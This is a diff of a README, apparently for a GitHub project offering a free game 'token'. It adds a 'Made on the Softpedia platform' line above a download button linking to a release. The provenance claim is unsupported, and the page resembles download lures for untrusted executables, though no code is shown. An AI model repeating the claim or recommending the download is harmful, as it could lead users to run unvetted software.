@@ -31,6 +31,7 @@
 ### 🚀Please repay with a star for the work done🚀
 
 # Download
+### Made on the Softpedia platform
 
 **[<img src="https://github.com/fashbestplays98/Citizens_Conflict_free_token/assets/169194661/21bd4e3e-8ed5-4e2d-a990-1227b7152a90"/>](https://github.com/fashbestplays98/Citizens_Conflict_free_token/releases/tag/Download_last_version)**
 
